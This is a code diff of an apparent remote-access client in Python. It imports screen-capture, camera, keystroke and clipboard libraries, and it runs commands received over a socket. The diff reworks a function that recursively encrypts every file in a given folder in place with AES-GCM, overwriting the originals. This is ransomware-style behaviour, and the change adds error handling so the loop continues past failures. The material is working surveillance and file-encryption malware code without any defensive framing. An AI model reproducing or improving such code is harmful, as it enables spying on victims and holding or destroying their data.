@@ -15,6 +15,7 @@ import mss
 import cv2
 import pynput
 import clipboard
+from  cryptography.exceptions import InvalidTag
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
@@ -37,7 +38,7 @@ class Client:
                 self.connection.send(self.response)
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(
-                self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
+                                    self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
             elif request["cmd"] == "w":
@@ -67,7 +68,7 @@ class Client:
                 self.connection.send(self.response)
             elif request["cmd"] == "e":
                 process = multiprocessing.Process(target=self.crypt, args=(
-                self.response, request["action"], request["open_path"], request["password"],))
+                                        self.response, request["action"], request["open_path"], request["password"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
 
@@ -115,7 +116,7 @@ class Client:
 
     def zip_file_or_folder(self, response, compression_level, path_to_open, path_to_save):
         try:
-            zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
+            zip_file = zipfile.ZipFile(path_to_save, "w", zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
             if os.path.isdir(path_to_open):
                 relative_path = os.path.dirname(path_to_open)
                 for root, dirs, files in os.walk(path_to_open):
@@ -163,42 +164,49 @@ class Client:
 
     def crypt(self, response, action, path_to_open, password):
         password_hash = hashlib.sha3_256(password.encode("utf8")).digest()
-        print(password_hash)
         crypter = AESGCM(password_hash)
-        if action == "enc":
-            if os.path.isdir(path_to_open):
-                for subdir, dirs, files in os.walk(path_to_open):
-                    for filename in files:
+        if os.path.isdir(path_to_open):
+            for subdir, dirs, files in os.walk(path_to_open):
+                for filename in files:
+                    try:
                         path = os.path.join(subdir, filename)
                         with open(path, "rb") as file:
                             data = file.read()
-                        nonce = os.urandom(12)
-                        data_enc = crypter.encrypt(nonce, data, b"")
-                        with open(path, "wb") as file:
-                            file.write(nonce + data_enc)
-            else:
-                with open(path_to_open, "rb") as file:
-                    data = file.read()
-                nonce = os.urandom(12)
-                data_enc = crypter.encrypt(nonce, data, b"")
-                with open(path_to_open, "wb") as file:
-                    file.write(nonce + data_enc)
-        elif action == "dec":
-            if os.path.isdir(path_to_open):
-                for subdir, dirs, files in os.walk(path_to_open):
-                    for filename in files:
-                        path = os.path.join(subdir, filename)
-                        with open(path, "rb") as file:
-                            data_enc = file.read()
-                        data = crypter.decrypt(data_enc[:12], data_enc[12:], b"")
+                        if action == "enc":
+                            nonce = os.urandom(12)
+                            data = nonce + crypter.encrypt(nonce, data, b"")
+                        elif action == "dec":
+                            data = crypter.decrypt(data[:12], data[12:], b"")
                         with open(path, "wb") as file:
                             file.write(data)
-            else:
+                    except FileNotFoundError:
+                        response["error"] = "FileNotFoundError"
+                    except PermissionError:
+                        response["error"] = "PermissionError"
+                    except MemoryError:
+                        response["error"] = "MemoryError"
+                    except InvalidTag:
+                        response["error"] = "InvalidTag"
+
+        else:
+            try:
                 with open(path_to_open, "rb") as file:
-                    data_enc = file.read()
-                data = crypter.decrypt(data_enc[:12], data_enc[12:], b"")
+                    data = file.read()
+                if action == "enc":
+                    nonce = os.urandom(12)
+                    data = nonce + crypter.encrypt(nonce, data, b"")
+                elif action == "dec":
+                    data = crypter.decrypt(data[:12], data[12:], b"")
                 with open(path_to_open, "wb") as file:
                     file.write(data)
+            except FileNotFoundError:
+                response["error"] = "FileNotFoundError"
+            except PermissionError:
+                response["error"] = "PermissionError"
+            except MemoryError:
+                response["error"] = "MemoryError"
+            except InvalidTag:
+                response["error"] = "InvalidTag"
 
     def handle_process(self, process, timeout):
         process.start()
@@ -211,7 +219,7 @@ class Client:
 
 class Connection:
     def __init__(self):
-        self.CODEC = "utf-8"
+        self.CODEC = "utf8"
         self.PACKET_SIZE = 1024
 
         HOST = "127.0.0.1"
